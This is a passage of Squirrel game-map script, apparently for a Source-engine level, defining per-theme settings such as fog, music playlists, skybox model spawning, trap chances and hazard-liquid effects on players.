		trapstep_chance					= 		30.00,
		trapvicinity_chance				= 		30.00,
		trapspawn_chance				= 		30.00,
		function HazliquidHurtLogic(player)
		{
			EntFireByHandle(player,"IgniteLifeTime","3",0.00,null,null);
		},
		traps_step = null,				//null:global list
		traps_vicinity = null,			//null:global list
		traps_spawn = null,				//null:global list
		items_h = null,					//null:global list
		items_z = null,					//null:global list
		music = [
							{file="#music/luffaren_collective/chosen_by_the_planet.mp3", 	volume=6,		pitch=100,		duration=49.00},
							{file="#music/luffaren_collective/dark_messenger.mp3", 			volume=8,		pitch=100,		duration=107.00},
							{file="#music/luffaren_collective/the_castle.mp3", 				volume=7,		pitch=100,		duration=70.50},
							{file="#music/luffaren_collective/the_devil.mp3", 				volume=5,		pitch=100,		duration=87.00},
							{file="#music/luffaren_collective/rear_garden.mp3", 				volume=7,		pitch=100,		duration=95.00},
							{file="#music/luffaren_collective/rear_garden2.mp3", 			volume=7,		pitch=100,		duration=25.00},
		],
		fog_color = Vector(200,255,100),
		fog_start = 500.00,
		fog_end = 10000.00,
		fog_density = 0.20,
		fog_farz = 600000.00,
		function SkyboxSetup()
		{
			EntFire("skyboxswapper","AddOutput","SkyboxName basicsky_castle",0.00,null);
			EntFire("skyboxswapper","Trigger","",0.05,null);
			//::manager.PrecacheModel("models/luffaren/collective_skybox_clouds.mdl");
			for(local i=0;i<2;i++)
				::Ent(Vector(0,0,-(0+::TELEHURT_Z_OFFSET+300)),Vector(0,RandomInt(0,360),0),"prop_dynamic",{
						model="models/luffaren/collective_skybox_clouds.mdl",
						spawnflags = "64",
						modelscale = 15,
						rendermode = 0,		//__CSS__ og was 2
						renderamt = 0,
						//body = 2,		//__CSS__ extra body for deeper bottom
						rendercolor = "0 0 0",
						targetname = "skybox_master",
					},{
					i = i,
					function Move(){
						try{self.SetOrigin(Vector(self.GetOrigin().x,self.GetOrigin().y,
						::MAPDATA[::manager.GetScriptScope().mapspawnindex].end_pos.z+(-(::TELEHURT_Z_OFFSET+300))));}catch(e){}
					},function Run(){
						local ii=0.00;for(local alpha=0;alpha<255;alpha+=5){
							EntFireByHandle(self,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
							ii += 0.05;}EntFireByHandle(self,"AddOutput","renderamt 255",ii,null,null);
						if(::DISABLE_SKYBOXMODELS)return;
						if(i>0)return;
						//::manager.PrecacheModel("models/luffaren/skybox_castle.mdl");
						
						//__CSS__ "models/luffaren/skybox_castle.mdl" now split into 1,2,3,4,5,6 parts due to complexity limit, spawned separately:
						for(local cind=1;cind<=6;cind++)
							::Ent(self.GetOrigin()+Vector(RandomFloat(-5000,5000),RandomFloat(-5000,5000),
								RandomFloat(-8000,-7500)),Vector(0,RandomFloat(0,360),0),"prop_dynamic",{
									model="models/luffaren/skybox_castle"+cind.tostring()+".mdl",
									spawnflags = "64",
									modelscale = RandomFloat(3.00,3.00),
									rendermode = 0,					//__CSS__ og was 9
									renderamt = 0,
									rendercolor = "150 150 120 0",
									targetname = "skybox_slave",
								},{
								master = self,
								function Run(){
									EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
									local ii=0.00;for(local alpha=0;alpha<255;alpha+=5){
										EntFireByHandle(self,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
										ii += 0.05;}EntFireByHandle(self,"AddOutput","renderamt 255",ii,null,null);
								}});
					}});
		},
	},
	factory = {
		airaccelerate					=		12,
		generichold_opentime			=		5.00,
		hold_opentime					=		0.00,
		endbutton_time					=		0.00,
		endtile_time					=		0.00,
		precipitations					=		[0,0,0,0,0,0,0,0,0,0,1,1,1,2,2,3,4],		//0:none   1:rain   2:rainstorm   3:snow   4:ash   else:none
		elevator_timings				=		Vector(1.50, 1.50, 5.00),					//(toggletime_MIN, toggletime_MAX, starttime_MAX *MIN@0.05*)
		elevator_speed_min				=		100,
		elevator_speed_max				=		200,
		hold_openspeed_min				=		100,
		hold_openspeed_max				=		100,
		wallheightrand_min				=		0.00,
		wallheightrand_max				=		6.00,
		breakable_health				= 		0.5,
		lowgrav_skin					=		2,
		airslide_skin					=		2,
		airslide_samerot				=		false,
		liquid_skin						=		1,
		hazliquid_skin					=		5,
		liquid_stream_pushamount		= 		200,
		hazliquid_stream_pushamount		= 		200,
		hazliquid_damage				= 		9,
		trapfloor_chance				= 		30.00,
		trapstep_chance					= 		30.00,
		trapvicinity_chance				= 		30.00,
		trapspawn_chance				= 		30.00,
		function HazliquidHurtLogic(player)
		{
			
		},
		traps_step = null,				//null:global list
		traps_vicinity = null,			//null:global list
		traps_spawn = null,				//null:global list
		items_h = null,					//null:global list
		items_z = null,					//null:global list
		music = [
							{file="#music/luffaren_collective/dizzy.mp3", 				volume=4,		pitch=100,		duration=100.00},
							{file="#music/luffaren_collective/traw.mp3", 				volume=10,		pitch=100,		duration=90.00},
							{file="#music/luffaren_collective/junction_seven.mp3", 		volume=5,		pitch=100,		duration=121.00},
							{file="#music/luffaren_collective/ethical.mp3", 				volume=8,		pitch=100,		duration=120.00},
		],
		fog_color = Vector(0,80,50),
		fog_start = -500.00,
		fog_end = 5000.00,
		fog_density = 0.50,
		fog_farz = 600000.00,
		function SkyboxSetup()
		{
			EntFire("skyboxswapper","AddOutput","SkyboxName basicsky_factory",0.00,null);
			EntFire("skyboxswapper","Trigger","",0.05,null);
			//::manager.PrecacheModel("models/luffaren/collective_skybox_clouds.mdl");
			for(local i=0;i<2;i++)
				::Ent(Vector(0,0,-(0+::TELEHURT_Z_OFFSET+300)),Vector(0,RandomInt(0,360),0),"prop_dynamic",{
						model="models/luffaren/collective_skybox_clouds.mdl",
						spawnflags = "64",
						modelscale = 15,
						rendermode = 0,		//__CSS__ og was 2
						renderamd = 0,
						rendercolor = "100 150 100",
						targetname = "skybox_master",
					},{function Move(){
						try{self.SetOrigin(Vector(self.GetOrigin().x,self.GetOrigin().y,
						::MAPDATA[::manager.GetScriptScope().mapspawnindex].end_pos.z+(-(::TELEHURT_Z_OFFSET+300))));}catch(e){}
					},function Run(){
						local ii=0.00;for(local alpha=0;alpha<255;alpha+=5){
							EntFireByHandle(self,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
							ii += 0.05;}EntFireByHandle(self,"AddOutput","renderamt 255",ii,null,null);
						if(::DISABLE_SKYBOXMODELS)return;
						//::manager.PrecacheModel("models/luffaren/skybox_factory.mdl");
						::Ent(self.GetOrigin()+Vector(RandomFloat(-5000,5000),RandomFloat(-5000,5000),RandomFloat(-5000,-4000)),Vector(0,RandomFloat(0,360),0),"prop_dynamic",{
								model="models/luffaren/skybox_factory.mdl",
								spawnflags = "64",
								modelscale = RandomFloat(3.00,4.00),
								rendermode = 0,			//__CSS__ og was 9
								renderamt = 0,
								rendercolor = "120 180 150 0",
								targetname = "skybox_slave",
							},{
							master = self,
							function Run(){
								EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
								local ii=0.00;for(local alpha=0;alpha<255;alpha+=5){
									EntFireByHandle(self,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
									ii += 0.05;}EntFireByHandle(self,"AddOutput","renderamt 255",ii,null,null);
							}});
					}});
		},
	},
	temple = {
		airaccelerate					=		12,
		generichold_opentime			=		5.00,
		hold_opentime					=		0.00,
		endbutton_time					=		0.00,
		endtile_time					=		0.00,
		precipitations					=		[0,0,0,0,0,0,0,0,0,0,1,1,1,2,2,3,4],		//0:none   1:rain   2:rainstorm   3:snow   4:ash   else:none
		elevator_timings				=		Vector(1.50, 1.50, 5.00),					//(toggletime_MIN, toggletime_MAX, starttime_MAX *MIN@0.05*)
		elevator_speed_min				=		100,
		elevator_speed_max				=		200,
		hold_openspeed_min				=		100,
		hold_openspeed_max				=		100,
		wallheightrand_min				=		0.00,
		wallheightrand_max				=		6.00,
		breakable_health				= 		0.5,
		lowgrav_skin					=		2,
		airslide_skin					=		2,
		airslide_samerot				=		false,
		liquid_skin						=		1,
		hazliquid_skin					=		7,
		liquid_stream_pushamount		= 		200,
		hazliquid_stream_pushamount		= 		200,
		hazliquid_damage				= 		9,
		trapfloor_chance				= 		30.00,
		trapstep_chance					= 		30.00,
		trapvicinity_chance				= 		30.00,
		trapspawn_chance				= 		30.00,
		function HazliquidHurtLogic(player)
		{
			EntFire("manager","RunScriptCode"," AddSpeed(-0.30,"+(::LIQUID_HURT_CD*2.50).tostring()+"); ",0.00,player);
		},
		traps_step = null,				//null:global list
		traps_vicinity = null,			//null:global list
		traps_spawn = null,				//null:global list
		items_h = null,					//null:global list
		items_z = null,					//null:global list
		music = [
							{file="#music/luffaren_collective/ghosts.mp3", 				volume=4,		pitch=100,		duration=96.50},
							{file="#music/luffaren_collective/memories_of_dust.mp3", 	volume=7,		pitch=100,		duration=145.00},
							{file="#music/luffaren_collective/mourning.mp3", 			volume=5,		pitch=100,		duration=141.00},
							{file="#music/luffaren_collective/woodfall.mp3", 			volume=5,		pitch=100,		duration=135.00},
		],
		fog_color = Vector(200,50,0),
		fog_start = -200.00,
		fog_end = 7000.00,
		fog_density = 0.60,
		fog_farz = 600000.00,
		function SkyboxSetup()
		{
			EntFire("skyboxswapper","AddOutput","SkyboxName basicsky_castle",0.00,null);
			EntFire("skyboxswapper","Trigger","",0.05,null);
			//::manager.PrecacheModel("models/luffaren/collective_skybox_clouds.mdl");
			for(local i=0;i<2;i++)
				::Ent(Vector(0,0,-(0+::TELEHURT_Z_OFFSET+300)),Vector(0,RandomInt(0,360),0),"prop_dynamic",{
						model="models/luffaren/collective_skybox_clouds.mdl",
						spawnflags = "64",
						modelscale = 15,
						rendermode = 0,		//__CSS__ og was 2
						renderamt = 0,
						rendercolor = "255 0 0",
						targetname = "skybox_master",
					},{function Move(){
						try{self.SetOrigin(Vector(self.GetOrigin().x,self.GetOrigin().y,
						::MAPDATA[::manager.GetScriptScope().mapspawnindex].end_pos.z+(-(::TELEHURT_Z_OFFSET+300))));}catch(e){}
					},function Run(){
						local ii=0.00;for(local alpha=0;alpha<255;alpha+=5){
							EntFireByHandle(self,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
							ii += 0.05;}EntFireByHandle(self,"AddOutput","renderamt 255",ii,null,null);
						if(::DISABLE_SKYBOXMODELS)return;
						//::manager.PrecacheModel("models/luffaren/skybox_temple.mdl");
						for(local i=0;i<2;i++)
						{
							::Ent(self.GetOrigin()+Vector(RandomFloat(-10000,10000),RandomFloat(-10000,10000),RandomFloat(-3000,3000)),Vector(0,RandomFloat(0,360),0),"prop_dynamic",{
									model="models/luffaren/skybox_temple.mdl",
									spawnflags = "64",
									modelscale = RandomFloat(2.00,4.00),
									rendermode = 0,		//__CSS__ og was 2
									renderamt = 0,
									rendercolor = "180 150 120 0",
									targetname = "skybox_slave",
								},{
								master = self,
								function Run(){
									EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
									local ii=0.00;for(local alpha=0;alpha<254;alpha+=5){
										EntFireByHandle(self,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
										ii += 0.05;}EntFireByHandle(self,"AddOutput","renderamt 254",ii,null,null);
								}});
						}
					}});
		},
	},
	nature = {
		airaccelerate					=		12,
		generichold_opentime			=		5.00,
		hold_opentime					=		0.00,
		endbutton_time					=		0.00,
		endtile_time					=		0.00,
		precipitations					=		[0,0,0,0,0,0,0,0,0,0,1,1,1,2,2,3,4],		//0:none   1:rain   2:rainstorm   3:snow   4:ash   else:none
		elevator_timings				=		Vector(1.50, 1.50, 5.00),					//(toggletime_MIN, toggletime_MAX, starttime_MAX *MIN@0.05*)
		elevator_speed_min				=		100,
		elevator_speed_max				=		200,
		hold_openspeed_min				=		100,
		hold_openspeed_max				=		100,
		wallheightrand_min				=		0.00,
		wallheightrand_max				=		6.00,
		breakable_health				= 		0.5,
		lowgrav_skin					=		1,
		airslide_skin					=		2,
		airslide_samerot				=		false,
		//::NATURE_LIQUID_RANDROT		=		true,		//find this var above and set it as desired (true: randomizes default dir)
		liquid_skin						=		1,
		hazliquid_skin					=		13,
		liquid_stream_pushamount		= 		200,
		hazliquid_stream_pushamount		= 		200,
		hazliquid_damage				= 		9,
		trapfloor_chance				= 		30.00,
		trapstep_chance					= 		30.00,
		trapvicinity_chance				= 		30.00,
		trapspawn_chance				= 		30.00,
		function HazliquidHurtLogic(player)
		{
			local vel = player.GetVelocity();
			vel.x = 0.00;
			vel.y = 0.00;
			player.SetVelocity(vel);
		},
		traps_step = null,				//null:global list
		traps_vicinity = null,			//null:global list
		traps_spawn = null,				//null:global list
		items_h = null,					//null:global list
		items_z = null,					//null:global list
		music = [
							{file="#music/luffaren_collective/nature_beats.mp3", 			volume=4,		pitch=100,		duration=80.50},
							{file="#music/luffaren_collective/woods_of_mystery.mp3", 		volume=4,		pitch=100,		duration=77.00},
							{file="#music/luffaren_collective/jungle_sounds.mp3", 			volume=4,		pitch=100,		duration=73.00},
							{file="#music/luffaren_collective/jungle_sounds.mp3", 			volume=4,		pitch=100,		duration=73.00},
							{file="#music/luffaren_collective/jungle_sounds.mp3", 			volume=4,		pitch=100,		duration=73.00},
							{file="#music/luffaren_collective/jungle_sounds2.mp3", 			volume=5,		pitch=100,		duration=85.00},
							{file="#music/luffaren_collective/jungle_sounds2.mp3", 			volume=5,		pitch=100,		duration=85.00},
							{file="#music/luffaren_collective/jungle_sounds2.mp3", 			volume=5,		pitch=100,		duration=85.00},
		],
		fog_color = Vector(120,140,70),
		fog_start = -1000.00,
		fog_end = 15000.00,
		fog_density = 0.70,
		fog_farz = 600000.00,
		function SkyboxSetup()
		{
			EntFire("skyboxswapper","AddOutput","SkyboxName basicsky_castle",0.00,null);
			EntFire("skyboxswapper","Trigger","",0.05,null);
			//::manager.PrecacheModel("models/luffaren/collective_skybox_clouds.mdl");
			for(local i=0;i<3;i++)
				::Ent(Vector(0,0,-(0+::TELEHURT_Z_OFFSET+300)),Vector(0,RandomInt(0,360),0),"prop_dynamic",{
						model="models/luffaren/collective_skybox_clouds.mdl",
						spawnflags = "64",
						modelscale = 15,
						rendermode = 0,		
						renderamt = 0,
						rendercolor = "50 150 0",
						targetname = "skybox_master",
					},{
					i = (0+i),
					function Move(){
						try{self.SetOrigin(Vector(self.GetOrigin().x,self.GetOrigin().y,
						::MAPDATA[::manager.GetScriptScope().mapspawnindex].end_pos.z+(-(::TELEHURT_Z_OFFSET+300))));}catch(e){}
					},function Run(){
						local ii=0.00;for(local alpha=0;alpha<255;alpha+=5){
							EntFireByHandle(self,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
							ii += 0.05;}EntFireByHandle(self,"AddOutput","renderamt 255",ii,null,null);
						//::manager.PrecacheModel("models/luffaren/skybox_nature.mdl");
						if(i==0)
							for(local i=0;i<3;i++)
							{
								::Ent(self.GetOrigin()+Vector(RandomFloat(-1000,1000),RandomFloat(-1000,1000),RandomFloat(-3000,3000)),Vector(0,RandomFloat(0,360),0),"prop_dynamic",{
										model="models/luffaren/skybox_nature.mdl",
										spawnflags = "64",
										modelscale = RandomFloat(43.00,43.00),
										rendermode = 0,
										renderamt = 0,
										rendercolor = "160 170 100 0",
										targetname = "skybox_slave",
									},{
									master = self,
									function Run(){
										EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
										local ii=0.00;for(local alpha=0;alpha<255;alpha+=5){
											EntFireByHandle(self,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
											ii += 0.05;}EntFireByHandle(self,"AddOutput","renderamt 255",ii,null,null);
									}});
							}
					}});
		},
	},
	hell = {
		airaccelerate					=		12,
		generichold_opentime			=		5.00,
		hold_opentime					=		0.00,
		endbutton_time					=		0.00,
		endtile_time					=		0.00,
		precipitations					=		[0,0,0,0,0,0,0,0,0,0,1,1,1,2,2,3,4],		//0:none   1:rain   2:rainstorm   3:snow   4:ash   else:none
		elevator_timings				=		Vector(1.50, 1.50, 5.00),					//(toggletime_MIN, toggletime_MAX, starttime_MAX *MIN@0.05*)
		elevator_speed_min				=		100,
		elevator_speed_max				=		200,
		hold_openspeed_min				=		100,
		hold_openspeed_max				=		100,
		wallheightrand_min				=		0.00,
		wallheightrand_max				=		6.00,
		breakable_health				= 		0.5,
		lowgrav_skin					=		1,
		airslide_skin					=		1,
		airslide_samerot				=		false,
		liquid_skin						=		9,
		hazliquid_skin					=		11,
		liquid_stream_pushamount		= 		200,
		hazliquid_stream_pushamount		= 		200,
		hazliquid_damage				= 		9,
		trapfloor_chance				= 		30.00,
		trapstep_chance					= 		30.00,
		trapvicinity_chance				= 		30.00,
		trapspawn_chance				= 		30.00,
		function HazliquidHurtLogic(player)
		{
			EntFireByHandle(player,"IgniteLifeTime","5",0.00,null,null);
		},
		traps_step = null,				//null:global list
		traps_vicinity = null,			//null:global list
		traps_spawn = null,				//null:global list
		items_h = null,					//null:global list
		items_z = null,					//null:global list
		music = [
							{file="#music/luffaren_collective/mechanicus.mp3", 				volume=10,		pitch=100,		duration=10.00},
							{file="#music/luffaren_collective/demonic_chanting.mp3", 		volume=5,		pitch=100,		duration=28.00},
							{file="#music/luffaren_collective/so_below.mp3", 				volume=10,		pitch=100,		duration=55.00},
							{file="#music/luffaren_collective/so_below.mp3", 				volume=10,		pitch=100,		duration=55.00},
							{file="#music/luffaren_collective/so_below.mp3", 				volume=10,		pitch=100,		duration=55.00},
							{file="#music/luffaren_collective/gothic_1.mp3", 				volume=10,		pitch=100,		duration=47.00},
							{file="#music/luffaren_collective/gothic_1.mp3", 				volume=10,		pitch=100,		duration=47.00},
							{file="#music/luffaren_collective/gothic_2.mp3", 				volume=10,		pitch=100,		duration=43.00},
							{file="#music/luffaren_collective/gothic_2.mp3", 				volume=10,		pitch=100,		duration=43.00},
							{file="#music/luffaren_collective/gothic_3.mp3", 				volume=10,		pitch=100,		duration=48.00},
							{file="#music/luffaren_collective/gothic_3.mp3", 				volume=10,		pitch=100,		duration=48.00},
							{file="#music/luffaren_collective/gothic_4.mp3", 				volume=5,		pitch=100,		duration=16.00},
							{file="#music/luffaren_collective/gothic_4.mp3", 				volume=5,		pitch=100,		duration=16.00},
							{file="#music/luffaren_collective/gothic_4.mp3", 				volume=5,		pitch=100,		duration=16.00},
							{file="#music/luffaren_collective/gothic_4.mp3", 				volume=5,		pitch=100,		duration=16.00},
							{file="#music/luffaren_collective/gothic_4.mp3", 				volume=5,		pitch=100,		duration=16.00},
		],
		fog_color = Vector(150,0,0),
		fog_start = 500.00,
		fog_end = 15000.00,
		fog_density = 0.40,
		fog_farz = 600000.00,
		function SkyboxSetup()
		{
			EntFire("skyboxswapper","AddOutput","SkyboxName basicsky_hell",0.00,null);
			EntFire("skyboxswapper","Trigger","",0.05,null);
			//::manager.PrecacheModel("models/luffaren/collective_skybox_clouds.mdl");
			for(local i=0;i<1;i++)
				//::Ent(Vector(0,0,-(0+::TELEHURT_Z_OFFSET+300)),Vector(0,RandomInt(0,360),0),"prop_dynamic",{		//__CSS__ <og, now clouds need to be lower
				::Ent(Vector(0,0,-(0+::TELEHURT_Z_OFFSET+300)),Vector(0,RandomInt(0,360),0),"prop_dynamic",{
						model="models/luffaren/collective_skybox_clouds.mdl",
						spawnflags = "64",
						modelscale = 20,
						rendermode = 0,			//__CSS__ og was 1
						body = 1,				//__CSS__ new - this disables the bottom
						renderamt = 0,
						rendercolor = "200 50 0",
						targetname = "skybox_master",
					},{
					i = i,
					function Move(){
						try{self.SetOrigin(Vector(self.GetOrigin().x,self.GetOrigin().y,
						::MAPDATA[::manager.GetScriptScope().mapspawnindex].end_pos.z+(-(::TELEHURT_Z_OFFSET+300))));}catch(e){}
					},
					function TickThunderFX()
					{
						EntFireByHandle(self,"RunScriptCode"," TickThunderFX(); ",RandomFloat(0.10,2.00),null,null);
						local spos2 = ::manager.GetScriptScope().pos+(::AnglesToDir(Vector(0,RandomFloat(0,360),0))*RandomFloat(10000,15000))+Vector(0,0,RandomFloat(2000,8000));
						if(spos2.x < -14000)spos2.x = -14000;else if(spos2.x > 14000)spos2.x = 14000;
						if(spos2.y < -14000)spos2.y = -14000;else if(spos2.y > 14000)spos2.y = 14000;
						if(spos2.z < -14000)spos2.z = -14000;else if(spos2.z > 14000)spos2.z = 14000;
						local scale = RandomFloat(20.00,80.00);
						local startframe = RandomInt(1,3);
						for(local i=0;i<1;i++)
						{
							::Ent(spos2,Vector(),"env_sprite",{
									spawnflags = 1,
									framerate = 50,
									frame = startframe,
									model = "materials/luffaren/thunder_animsprite.vmt",
									scale = scale,
									rendermode = 7,
									rendercolor = "20 20 15",
								},{function Run(){
									EntFireByHandle(self,"Kill","",RandomFloat(0.05,0.30),null,null);
								}});
						}
						if(RandomFloat(0.00,100.00) <= 10.00)
						{
							::Sound("*luffaren/thunder_dist_2.mp3",Vector(),null,0,0.50,RandomInt(30,170),RandomInt(1,10));
							if(RandomFloat(0.00,100.00) <= 10.00)
								::Sound("*luffaren/thunder_dist_"+RandomInt(1,3).tostring()+".mp3",Vector(),null,0,0.50,RandomInt(90,110),RandomInt(1,10));
						}
					}
					function Run(){
						local ii=0.00;for(local alpha=0;alpha<255;alpha+=5){
							EntFireByHandle(self,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
							ii += 0.05;}EntFireByHandle(self,"AddOutput","renderamt 255",ii,null,null);
						//::manager.PrecacheModel("models/luffaren/skybox_hell.mdl");
						if(i==0)
						{
							for(local iii=0;iii<5;iii++)
							{
								local rcol = RandomInt(100,120);
								rcol = ""+rcol.tostring()+" "+rcol.tostring()+" "+rcol.tostring()+" 0";
								::Ent(self.GetOrigin()+Vector(RandomFloat(-1000,1000),RandomFloat(-1000,1000),RandomFloat(-3000,3000)),Vector(0,RandomFloat(0,360),0),"prop_dynamic",{
										model="models/luffaren/skybox_hell.mdl",
										spawnflags = "64",
										modelscale = RandomFloat(4.00,5.00),
										rendermode = 0,			//__CSS__ og was 9
										renderamt = 0,
										rendercolor = rcol,
										targetname = "skybox_slave",
										glowenabled = 1,
										glowstyle = 1,
										glowdist = 500000,
										glowcolor = "15 3 0",
									},{
									iii = iii,
									master = self,
									function Run(){
										EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
										local ii=0.00;for(local alpha=0;alpha<255;alpha+=5){
											EntFireByHandle(self,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
											ii += 0.05;}EntFireByHandle(self,"AddOutput","renderamt 255",ii,null,null);
									}});
							}
							TickThunderFX();
						}
					}});
		},
	},
	frost = {
		airaccelerate					=		12,
		generichold_opentime			=		5.00,
		hold_opentime					=		0.00,
		endbutton_time					=		0.00,
		endtile_time					=		0.00,
		precipitations					=		[0,0,0,0,0,0,0,0,0,0,1,1,1,2,2,3,4],		//0:none   1:rain   2:rainstorm   3:snow   4:ash   else:none
		elevator_timings				=		Vector(1.50, 1.50, 5.00),					//(toggletime_MIN, toggletime_MAX, starttime_MAX *MIN@0.05*)
		elevator_speed_min				=		100,
		elevator_speed_max				=		200,
		hold_openspeed_min				=		100,
		hold_openspeed_max				=		100,
		wallheightrand_min				=		0.00,
		wallheightrand_max				=		6.00,
		breakable_health				= 		0.5,
		lowgrav_skin					=		1,
		airslide_skin					=		2,
		airslide_samerot				=		false,
		liquid_skin						=		17,
		hazliquid_skin					=		15,
		liquid_stream_pushamount		= 		200,
		hazliquid_stream_pushamount		= 		200,
		hazliquid_damage				= 		9,
		trapfloor_chance				= 		30.00,
		trapstep_chance					= 		30.00,
		trapvicinity_chance				= 		30.00,
		trapspawn_chance				= 		30.00,
		function HazliquidHurtLogic(player)
		{
			EntFire("manager","RunScriptCode"," AddSpeed(-0.10,"+(::LIQUID_HURT_CD*5.00).tostring()+"); ",0.00,player);
			local vel = player.GetVelocity();
			vel.x = 0.00;
			vel.y = 0.00;
			player.SetVelocity(vel);
		},
		traps_step = null,				//null:global list
		traps_vicinity = null,			//null:global list
		traps_spawn = null,				//null:global list
		items_h = null,					//null:global list
		items_z = null,					//null:global list
		music = [
							{file="#music/luffaren_collective/wind_sounds.mp3", 				volume=5,		pitch=40,		duration=30.00,		snowstorm_overlay=true		},
							{file="#music/luffaren_collective/wind_sounds.mp3", 				volume=5,		pitch=40,		duration=30.00,		snowstorm_overlay=true		},
							{file="#music/luffaren_collective/wind_sounds.mp3", 				volume=5,		pitch=40,		duration=30.00,		snowstorm_overlay=true		},
							{file="#music/luffaren_collective/wind_sounds.mp3", 				volume=5,		pitch=40,		duration=30.00,		snowstorm_overlay=true		},
							{file="#music/luffaren_collective/godswood.mp3", 				volume=8,		pitch=100,		duration=56.00		},
							{file="#music/luffaren_collective/phendrana.mp3", 				volume=10,		pitch=100,		duration=101.20		},
							{file="#music/luffaren_collective/phendrana_short.mp3", 			volume=8,		pitch=57,		duration=32.00		},
							{file="#music/luffaren_collective/phendrana_short.mp3", 			volume=8,		pitch=57,		duration=32.00		},
		],
		fog_color = Vector(0,200,255),
		fog_start = 500.00,
		fog_end = 15000.00,
		fog_density = 0.40,
		fog_farz = 2000000.00,		//__CSS__ was 600000 originally
		function SkyboxSetup()
		{
			EntFire("skyboxswapper","AddOutput","SkyboxName basicsky",0.00,null);
			EntFire("skyboxswapper","Trigger","",0.05,null);
			//::manager.PrecacheModel("models/luffaren/collective_skybox_clouds.mdl");
			local zofff = 3500;
			for(local i=0;i<2;i++)
				::Ent(Vector(0,0,-(0+::TELEHURT_Z_OFFSET+300)+(-zofff)),Vector(0,RandomInt(0,360),0),"prop_dynamic",{
						model="models/luffaren/collective_skybox_clouds.mdl",
						spawnflags = "64",
						modelscale = 15,
						rendermode = 0,		//__CSS__ og was 9
						renderamt = 0,
						rendercolor = "0 200 255",
						targetname = "skybox_master",
					},{
					i = (0+i),
					zofff = zofff,
					function Move(){
						try{self.SetOrigin(Vector(self.GetOrigin().x,self.GetOrigin().y,
						::MAPDATA[::manager.GetScriptScope().mapspawnindex].end_pos.z+(-(::TELEHURT_Z_OFFSET+300)+(-zofff))));}catch(e){}
					},function Run(){
						local ii=0.00;for(local alpha=0;alpha<255;alpha+=5){
							EntFireByHandle(self,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
							ii += 0.05;}EntFireByHandle(self,"AddOutput","renderamt 255",ii,null,null);
						//::manager.PrecacheModel("models/luffaren/skybox_frost.mdl");
						if(i==0)
						{
							local randang = RandomFloat(0,360);
							local randdir = ::AnglesToDir(Vector(0,randang,0));
							::Ent(Vector(randdir*15000,randdir* -15000,-8000),Vector(0,randang,0),"prop_dynamic",{
									model="models/luffaren/skybox_frost.mdl",
									spawnflags = "64",
									modelscale = RandomFloat(12.00,12.00),
									rendermode = 0,		//__CSS__ og was 1
									renderamt = 0,
									rendercolor = "255 255 255 0",
									targetname = "skybox_slave",
								},{
								master = self,
								function Run(){
									EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
									local ii=0.00;for(local alpha=0;alpha<255;alpha+=5){
										EntFireByHandle(self,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
										ii += 0.05;}EntFireByHandle(self,"AddOutput","renderamt 255",ii,null,null);
								}});
						}
					}});
		},
	},
	silenthill = {
		airaccelerate					=		12,
		generichold_opentime			=		5.00,
		hold_opentime					=		0.00,
		endbutton_time					=		0.00,
		endtile_time					=		0.00,
		precipitations					=		[0,0,0,0,0,0,0,0,0,0,1,1,1,2,2,3,4],		//0:none   1:rain   2:rainstorm   3:snow   4:ash   else:none
		elevator_timings				=		Vector(1.50, 1.50, 5.00),					//(toggletime_MIN, toggletime_MAX, starttime_MAX *MIN@0.05*)
		elevator_speed_min				=		100,
		elevator_speed_max				=		200,
		hold_openspeed_min				=		100,
		hold_openspeed_max				=		100,
		wallheightrand_min				=		0.00,
		wallheightrand_max				=		0.00,		//is usually 6, but set to 0 for silenthill to make it a bit more 'building-like'
		breakable_health				= 		0.5,
		lowgrav_skin					=		1,
		airslide_skin					=		3,
		airslide_samerot				=		false,
		liquid_skin						=		1,
		hazliquid_skin					=		19,
		liquid_stream_pushamount		= 		200,
		hazliquid_stream_pushamount		= 		200,
		hazliquid_damage				= 		9,
		trapfloor_chance				= 		30.00,
		trapstep_chance					= 		30.00,
		trapvicinity_chance				= 		30.00,
		trapspawn_chance				= 		30.00,
		function HazliquidHurtLogic(player)
		{
			if(::silenthill_darkworld)
			{
				if(player.GetTeam()==2)return;
				EntFire("manager","RunScriptCode"," AddSpeed(-0.45,"+(::LIQUID_HURT_CD*1.20).tostring()+"); ",0.00,player);
				EntFireByHandle(player,"SetHealth","1",0.00,null,null);
				EntFireByHandle(player,"SetHealth","1",0.05,null,null);
				local vel = player.GetVelocity();
				vel.x = 0.00;
				vel.y = 0.00;
				player.SetVelocity(vel);
			}
			else
			{
				EntFire("manager","RunScriptCode"," AddSpeed(-0.45,"+(::LIQUID_HURT_CD*1.20).tostring()+"); ",0.00,player);
				local vel = player.GetVelocity();
				vel.x = 0.00;
				vel.y = 0.00;
				player.SetVelocity(vel);
			}
		},
		traps_step = null,				//null:global list
		traps_vicinity = null,			//null:global list
		traps_spawn = null,				//null:global list
		items_h = null,					//null:global list
		items_z = null,					//null:global list
		music = [
							{file="*luffaren/silenthill_siren.mp3", 							volume=10,		pitch=100,		duration=19.00,		silenthill_toggle=true},
							{file="*luffaren/silenthill_siren.mp3", 							volume=10,		pitch=100,		duration=19.00,		silenthill_toggle=true},
							{file="*luffaren/silenthill_siren.mp3", 							volume=10,		pitch=100,		duration=19.00,		silenthill_toggle=true},
							{file="#music/luffaren_collective/terror_in_the_depths.mp3", 		volume=5,		pitch=100,		duration=69.00		},
							{file="#music/luffaren_collective/true.mp3", 						volume=10,		pitch=100,		duration=57.00		},
							{file="#music/luffaren_collective/true.mp3", 						volume=10,		pitch=100,		duration=57.00		},
							{file="#music/luffaren_collective/forest.mp3", 						volume=10,		pitch=100,		duration=46.00		},
